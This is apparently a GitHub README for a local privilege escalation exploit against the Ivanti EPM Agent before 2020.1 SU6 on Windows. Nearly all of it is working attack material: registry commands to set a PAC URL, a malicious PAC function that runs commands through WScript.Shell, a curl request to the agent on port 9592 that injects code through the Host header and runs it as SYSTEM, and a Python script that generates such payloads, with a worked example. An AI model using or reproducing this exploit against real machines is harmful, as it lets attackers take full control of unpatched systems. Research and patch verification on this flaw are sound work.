# Ivanti-EPM-LPE
Ivanti EPM Agent < 2020.1 SU6 Windows Local Privilege Escalation

1) Check if a PAC script is already set:
```
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL
```
2) A PAC script must be set manually if no registry key is found:
```
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL /t REG_SZ /d _CUSTOM_PAC_URL_ /f
```
3) Run the first command to check if changes were made.
4a) If a custom PAC URL was supplied, the following code can be used in the PAC script to supply commands to execute:

```
function FindProxyForURL(url,host) {
	var shell = new ActiveXObject("WScript.Shell");
	shell.Run("_COMMAND_");
}
```


4b) Now the below Curl request triggers injection of the code in the PAC and executes it as SYSTEM

```
curl http://localhost:9592 -H "Host: \"+\""
```

5) If any other PAC script is enabled, use the Python script below to generate the curl request that triggers code injection:

```
def replace_special_chars(s):
    def escape(c): return str(ord(c))

    r, c = [], []
    for ch in s:
        if ch.isalnum() or ch in ' \t\n\r\x0b\x0c':
            if c: r.append(f'+String.fromCharCode({",".join(c)})+'); c = []
            r.append(f'\\"{ch}\\"')
        else:
            c.append(escape(ch))

    if c: r.append(f'+String.fromCharCode({",".join(c)})+')

    return ''.join(r).replace('++', '+').replace('\\"\\"', '').strip('+')

if __name__ == "__main__":
    input_string = input("Enter the command to be executed: ")
    command = replace_special_chars(input_string)
    host = f"\\\"+(new ActiveXObject(\\\"WScript.Shell\\\")).Run({command})+\\\""
    if len(host.replace("\\","")) > 255:
        print("CAUTION: Host header length exceeded 255 characters, Curl will not send the entire value")
    print(f"Exploit request:\n\ncurl http://localhost:9592 -H \"Host: {host}\"")

```


Example request that executes "cmd /c whoami > C:\\Temp\proof.txt"

```
curl http://localhost:9592 -H "Host: \"+(new ActiveXObject(\"WScript.Shell\")).Run(\"cmd \"+String.fromCharCode(47)+\"c whoami \"+String.fromCharCode(62)+\" C\"+String.fromCharCode(58,92)+\"Temp\"+String.fromCharCode(92)+\"proof\"+String.fromCharCode(46)+\"txt\")+\""
```
